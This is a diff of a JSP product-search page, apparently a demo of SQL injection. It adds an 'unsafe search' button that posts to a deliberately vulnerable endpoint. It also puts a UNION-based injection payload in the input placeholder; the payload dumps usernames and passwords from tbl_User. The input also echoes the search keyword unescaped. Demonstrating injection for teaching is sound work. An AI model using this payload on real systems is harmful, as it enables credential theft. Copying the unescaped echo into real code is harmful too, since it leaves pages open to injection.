@@ -111,18 +111,31 @@
 </head>
 <body>
 
+<script>
+function timSanPhamKhongAnToan() {
+    const form = document.getElementById("searchForm");
+    form.action = "timsanphamkhongantoan";
+    form.submit();
+}
+</script>
+
 <div class="container">
 
     <h2>Northwind Products</h2>
 
-    <form action="timsanpham" method="post" class="search-box">
+    <form id="searchForm" action="timsanpham" method="post" class="search-box">
         <input
             type="text"
             name="q"
             value="<%= keyword %>"
-            placeholder="Nhập tên sản phẩm..."
+            placeholder="' UNION select id ProductID, username+','+[password] ProductName,		 0 UnitPrice, 0 UnitsInStock from tbl_User--"
         >
         <button type="submit">Tìm kiếm</button>
+
+
+         <button type="button" onclick="timSanPhamKhongAnToan()" style="background-color: #e74c3c;">
+        Tìm kiếm không an toàn
+    </button>
     </form>
 
     <table>
